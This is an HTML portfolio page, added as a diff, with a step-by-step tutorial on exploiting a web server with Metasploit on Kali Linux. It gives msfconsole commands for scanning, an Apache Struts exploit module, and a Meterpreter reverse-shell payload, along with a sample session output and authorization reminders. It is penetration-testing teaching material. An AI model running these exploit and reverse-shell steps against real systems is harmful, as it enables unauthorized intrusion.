@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portfolio Page</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: #fff;
+        }
+        .back-button {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            padding: 10px 20px;
+            background-color: #0d1b2a;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            transition: background-color 0.3s;
+        }
+        .back-button:hover {
+            background-color: #f4a261;
+        }
+        .hero {
+            width: 100%;
+            height: 400px;
+            overflow: hidden;
+            position: relative;
+        }
+        .hero video, .hero img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .content, .technologies {
+            max-width: 1300px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .card {
+            background-color: #181414;
+            padding: 50px;
+            margin: 10%;
+            margin-bottom: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+        .p {
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        .technologies {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px;
+            justify-content: center;
+        }
+        .tech-card {
+            background-color: #1b263b;
+            padding: 10px 20px;
+            border-radius: 5px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+            font-size: 16px;
+        }
+        pre {
+            background-color: #1b263b;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+        code {
+            font-family: Consolas, monospace;
+            color: #f4a261;
+        }
+        @media (max-width: 768px) {
+            .back-button {
+                top: 10px;
+                left: 10px;
+                padding: 8px 15px;
+                font-size: 14px;
+            }
+            .hero {
+                height: 200px;
+            }
+            .card, .p, .tech-card {
+                padding: 10px;
+                font-size: 14px;
+            }
+        }
+        b {
+            color: #f4a261;
+        }
+    </style>
+</head>
+<body>
+    <button class="back-button" onclick="history.back()">Back</button>
+    <div class="card">
+      
+        <div class="hero">
+            <video controls poster="../thamb/webhack.png">
+                <source src="../video/webserver hacking.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+         <div class="content">
+            <div class="p"><b>Web Server Exploitation with Metasploit</b></div>
+            <div class="p">Metasploit Framework (MSF) is a powerful open-source penetration testing tool pre-installed on Kali Linux. It helps security professionals identify and exploit vulnerabilities in web servers to assess system security. Always obtain explicit permission from the target system's owner before performing any exploitation to avoid legal issues.</div>
+            <div class="p"><b>Steps to Exploit a Web Server Using Metasploit on Kali Linux</b></div>
+            <div class="p"><b>1. Verify Metasploit Installation</b><br>Metasploit is pre-installed on Kali Linux.<br>Check the installed version to ensure it’s ready:<br><pre><code>msfconsole -v</code></pre><b>Explanation:</b> The <code>-v</code> flag displays the current version of Metasploit, confirming the tool is installed and functional.</div>
+            <div class="p"><b>2. Start Metasploit Console</b><br>Launch the Metasploit command-line interface:<br><pre><code>msfconsole</code></pre><b>Explanation:</b> This command opens the Metasploit console, where you can interact with modules, configure exploits, and manage sessions.</div>
+            <div class="p"><b>3. Update Metasploit Database</b><br>Initialize the database (if not already set up):<br><pre><code>msfdb init</code></pre><b>Explanation:</b> Initializes the Metasploit database to store scan results and configurations.<br>Update Metasploit to get the latest exploits:<br><pre><code>msfupdate</code></pre><b>Explanation:</b> Fetches the latest modules and updates from the Metasploit repository to ensure access to new exploits and payloads.</div>
+            <div class="p"><b>4. Get Authorization</b><br>Obtain explicit written permission from the target system's owner before proceeding with any exploitation activities to comply with legal and ethical standards.</div>
+            <div class="p"><b>5. Scan for Vulnerabilities</b><br>Use an auxiliary scanner to identify web server details (e.g., Apache version):<br><pre><code>use auxiliary/scanner/http/apache_version<br>set RHOSTS example.com<br>run</code></pre><b>Explanation:</b><br>- <code>use auxiliary/scanner/http/apache_version</code>: Selects a module to detect the Apache server version.<br>- <code>set RHOSTS example.com</code>: Specifies the target server’s address.<br>- <code>run</code>: Executes the scanner to gather information about the target.</div>
+            <div class="p"><b>6. Select an Exploit</b><br>Choose an exploit for a known vulnerability (e.g., Apache Struts vulnerability):<br><pre><code>use exploit/multi/http/struts2_rest_xstream<br>set RHOSTS example.com<br>set RPORT 8080<br>set TARGETURI /struts2-rest-showcase/orders/<br>exploit</code></pre><b>Explanation:</b><br>- <code>use exploit/multi/http/struts2_rest_xstream</code>: Selects an exploit for Apache Struts vulnerabilities.<br>- <code>set RHOSTS example.com</code>: Sets the target server’s address.<br>- <code>set RPORT 8080</code>: Specifies the port where the web server is running.<br>- <code>set TARGETURI /struts2-rest-showcase/orders/</code>: Defines the specific URI path to target.<br>- <code>exploit</code>: Attempts to exploit the vulnerability.</div>
+            <div class="p"><b>7. Configure Payload</b><br>Set a payload to gain access (e.g., Meterpreter reverse shell):<br><pre><code>set PAYLOAD windows/meterpreter/reverse_tcp<br>set LHOST [Your_IP]<br>set LPORT 4444</code></pre><b>Explanation:</b><br>- <code>set PAYLOAD windows/meterpreter/reverse_tcp</code>: Chooses a Meterpreter payload that establishes a reverse connection to the attacker’s machine.<br>- <code>set LHOST [Your_IP]</code>: Specifies the attacker’s IP address for the target to connect back to.<br>- <code>set LPORT 4444</code>: Sets the port for the reverse connection.</div>
+            <div class="p"><b>8. Execute the Exploit</b><br>Run the exploit to attempt to gain access:<br><pre><code>exploit</code></pre><b>Explanation:</b> This command launches the exploit with the configured settings, attempting to compromise the target and open a session (e.g., Meterpreter) if successful.</div>
+            <div class="p"><b>9. Review Results</b><br>Analyze the output for successful exploitation or errors.<br>Example output:<br><pre><code>[*] Meterpreter session 1 opened (Your_IP:4444 -> Target_IP:Port)<br>[*] Command shell session opened</code></pre><b>Explanation:</b> Indicates a successful exploit with an open Meterpreter session, allowing further interaction with the target. Verify findings manually to confirm vulnerabilities and avoid false positives. Document all actions for reporting.</div>
+            <div class="p"><b>Important Notes</b><br>- Use Metasploit responsibly and ethically.<br>- Test in a controlled environment (e.g., a lab) before targeting real systems.<br>- Always comply with legal and organizational policies.</div>
+        </div>
+        <div class="technologies">
+            <div class="tech-card">penetration testing tool</div>
+            <div class="tech-card">Web server hacking</div>
+            <div class="tech-card">Metasploit</div>
+        </div>
+    </div>
+    <script>
+        // JavaScript for dynamic behavior
+        window.addEventListener('resize', () => {
+            const hero = document.querySelector('.hero');
+            if (window.innerWidth <= 768) {
+                hero.style.height = '200px';
+            } else {
+                hero.style.height = '400px';
+            }
+        });
+
+        // Fallback to image if video fails
+        const video = document.querySelector('video');
+        video.addEventListener('error', () => {
+            const hero = document.querySelector('.hero');
+            const img = document.createElement('img');
+            img.src = 'sample-image.jpg';
+            img.alt = 'Fallback Image';
+            hero.innerHTML = '';
+            hero.appendChild(img);
+        });
+    </script>
+</body>
+</html>
